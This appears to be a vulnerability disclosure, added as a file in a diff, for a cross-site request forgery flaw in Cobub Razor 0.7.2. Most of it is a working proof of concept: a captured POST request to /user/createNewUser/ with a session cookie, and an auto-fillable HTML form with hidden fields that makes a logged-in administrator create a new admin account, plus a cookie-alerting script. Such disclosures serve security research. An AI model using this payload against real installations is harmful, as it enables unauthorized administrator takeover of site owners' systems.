@@ -1,0 +1,48 @@
+﻿Vendor Homepage  :  http://www.cobub.com/
+Software Link    :  https://github.com/cobub/razor/releases
+Version          :  0.7.2
+
+##  CVE description  ##
+A cross-site request forgery (CSRF) vulnerability exists in Western Bridge Cobub Razor 0.7.2 via /index.php?/user/createNewUser/, resulting in account creation.
+
+##  Technical details  ##
+In /index.php?/user/createNewUser/ POST:username=&email=&password=&confirm_password=&userrole=&user%2FccreateNewUser=.
+Because the Cobub Razor is lack of identity authentication ,When attacker induce authenticated admin user to a malicious web page, the account will be created without admin user's intention.
+
+##  Proof of Concept  ##
+1. Login to console page.(/index.php?/auth/login -> /index.php?/)
+2. Keep login and access the PoC payload html it has following content
+
+request:
+POST /index.php?/user/createNewUser/ HTTP/1.1
+Accept: text/html, application/xhtml+xml, image/jxr, */*
+Referer: http://localhost
+Accept-Language: zh-CN
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MANMJS; rv:11.0) like Gecko
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Content-Length: 122
+Host: localhost:80
+Pragma: no-cache
+Cookie: ci_session2=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22c234df4ea2a0b843401dd9465f1c7c49%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A7%3A%220.0.0.0%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A77%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+Trident%2F7.0%3B+MANMJS%3B+rv%3A11.0%29+like+Gecko%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1520384883%3B%7D12178fe8e9554e0e6aa6007fb4476dfc
+Connection: close
+
+username=test123&email=test@test123.test&password=test&confirm_password=test&userrole=3&user%2FccreateNewUser=%E5%88%9B%E5%BB%BA
+
+Userrole is 3, which means that the user is admin.
+
+PoC payload:
+<html>
+  <body>
+  <script>alert(document.cookie)</script>
+    <form action="http://localhost/index.php?/user/createNewUser/" method="POST">
+      <input type="hidden" name="username" value="test123" />
+      <input type="hidden" name="email" value="test&#64;test123&#46;test" />
+      <input type="hidden" name="password" value="test" />
+      <input type="hidden" name="confirm&#95;password" value="test" />
+      <input type="hidden" name="userrole" value="3" />
+      <input type="hidden" name="user&#47;ccreateNewUser" value="�&#136;&#155;�&#187;�" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
